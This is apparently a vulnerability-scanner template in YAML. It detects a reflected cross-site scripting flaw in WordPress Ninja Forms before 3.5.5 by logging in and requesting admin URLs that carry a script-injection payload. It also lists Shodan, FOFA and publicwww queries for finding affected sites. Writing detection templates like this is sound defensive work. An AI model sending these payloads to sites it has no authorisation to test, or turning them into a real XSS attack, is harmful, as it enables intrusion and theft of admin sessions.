flow: http(1) && http(2) && http(3)
http:
- matchers:
  - internal: true
    part: body_1
    type: word
    words:
    - /wp-content/plugins/ninja-forms
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - internal: true
    status:
    - 302
    type: status
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
- matchers:
  - part: body
    type: word
    words:
    - '"><script>alert(/document_domain/)</script>'
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - wp-admin/admin.php?page=nf-settings&"><script>alert(/document.domain/)</script>
    - wp-admin/admin.php?page=nf-import-export&"><script>alert(/document.domain/)</script>
    - wp-admin/edit.php?post_status=all&post_type=nf_sub&form_id=1&"><script>alert(/document.domain/)</script>
  raw:
  - 'GET /{{path}} HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: ninja-forms-xss
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:ninjaforms:ninja_forms:*:*:*:*:*:wordpress:*:*
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
  description: 'The Ninja Forms WordPress plugin before 3.5.5 does not escape an URL
    before outputting it back in an attribute, leading to a Reflected Cross-Site Scripting
    which could be used against high privilege users such as admin

    '
  impact: 'Attackers can potentially exploit this XSS vulnerability to gain unauthorized
    access to sensitive information.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/ninja-forms"
    framework: wordpress
    max-request: 5
    product: ninja_forms
    publicwww-query: /wp-content/plugins/ninja-forms/
    shodan-query: http.html:"/wp-content/plugins/ninja-forms/"
    vendor: ninjaforms
  name: Ninja Forms < 3.5.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/ba6fa3d6-e3f7-449a-bd78-d57c26a67aa6/
  remediation: 'Update the plugin to Latest version. Fixed in 3.5.5.

    '
  severity: medium
  tags: cve2021,wp,wordpress,wp-plugin,ninja-forms,xss,authenticated,vuln
